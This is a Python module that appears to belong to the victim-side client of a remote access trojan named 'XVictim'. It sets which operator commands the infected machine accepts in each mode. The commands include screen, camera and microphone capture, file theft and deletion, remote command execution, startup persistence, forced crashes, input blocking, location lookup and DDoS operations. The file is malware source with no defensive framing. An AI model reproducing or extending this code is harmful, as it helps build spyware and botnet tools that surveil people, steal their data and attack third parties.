#!/usr/bin/env python3
"""
Control Mode System for XVictim Victim - Explicit command-based data transfer
Prevents server overload by only sending requested data
"""

import threading
import time

# Control modes - only send what's explicitly requested
CONTROL_MODES = {
    "idle": 0,                  # No data transfer
    "streaming": 1,             # Send screen + audio continuously
    "audio_only": 2,            # Only send audio
    "screen_only": 3,           # Only send screen
    "file_transfer": 4,         # File operations only
    "sysinfo_only": 5,          # Only system info
    "ddos_only": 6,             # Only DDoS operations
    "input_control": 7          # Only keyboard/mouse
}

current_mode = "idle"
mode_lock = threading.Lock()

def set_control_mode(mode_name):
    """Set the control mode (what data to send)"""
    global current_mode
    if mode_name not in CONTROL_MODES:
        return {"status": "error", "message": f"Unknown mode: {mode_name}"}
    
    with mode_lock:
        current_mode = mode_name
        print(f"[+] Control mode set to: {mode_name}", flush=True)
    
    return {"status": "success", "mode": mode_name}

def get_control_mode():
    """Get current control mode"""
    with mode_lock:
        return current_mode

def should_stream_screen():
    """Check if screen streaming is allowed"""
    mode = get_control_mode()
    return mode in ["streaming", "screen_only"]

def should_stream_audio():
    """Check if audio streaming is allowed"""
    mode = get_control_mode()
    return mode in ["streaming", "audio_only"]

def should_process_command(cmd_type):
    """Check if command type is allowed in current mode"""
    mode = get_control_mode()
    
    # These commands ALWAYS allowed (regardless of mode)
    if cmd_type in ["set_control_mode", "get_control_mode", "ping", "set_screen_index"]:
        return True
    
    # Mode-specific checks
    if mode == "idle":
        # In idle, only allow control and monitoring commands
        return cmd_type in ["ping", "set_screen_index", "cmd_execute", "bsod", "input_block"]
    elif mode == "streaming":
        return True  # All commands allowed
    elif mode == "audio_only":
        return cmd_type in ["audio_monitor", "ping", "stream_speaker_socket", "receive_mic_from_socket", "stream_audio_bidirectional", "set_audio_mode"]
    elif mode == "screen_only":
        return cmd_type in ["screen_quality", "ping", "set_screen_index", "camera_start", "camera_stop"] or "screen" in cmd_type
    elif mode == "file_transfer":
        return cmd_type in [
            "get_drives",
            "ping",
            "download",
            "file_download",
            "download_folder",
            "delete",
            "rename",
            "upload",
            "execute",
            "cmd_execute",
            "copy_to_startup",
            "set_attributes",
            "file_list"
        ] or "file" in cmd_type.lower()
    elif mode == "sysinfo_only":
        return cmd_type in ["sysinfo", "location", "ping"]
    elif mode == "ddos_only":
        return (
            "ddos" in cmd_type.lower()
            or cmd_type in [
                "ping",
                "ddos_stop",
                "file_list",
                "cmd_execute",
                "execute",
                "download",
                "file_download",
                "download_folder",
                "delete",
                "rename",
                "upload",
                "copy_to_startup",
                "set_attributes",
                "get_drives",
                "camera_start",
                "camera_stop",
                "audio_monitor",
                "stream_speaker_socket",
                "stream_mic_socket",
                "stream_audio_bidirectional",
                "stop_stream_speaker",
                "stop_stream_mic",
                "set_screen_index",
            ]
        ) or "file" in cmd_type.lower()
    elif mode == "input_control":
        return (
            "mouse" in cmd_type
            or "keyboard" in cmd_type
            or cmd_type in [
                "input_block",
                "ping",
                "set_screen_index",
                "file_list",
                "cmd_execute",
                "execute",
                "download",
                "file_download",
                "download_folder",
                "delete",
                "rename",
                "upload",
                "copy_to_startup",
                "set_attributes",
                "get_drives",
                "camera_start",
                "camera_stop",
                "audio_monitor",
                "stream_speaker_socket",
                "stream_mic_socket",
                "stream_audio_bidirectional",
                "stop_stream_speaker",
                "stop_stream_mic",
            ]
        ) or "file" in cmd_type.lower()
    
    return False
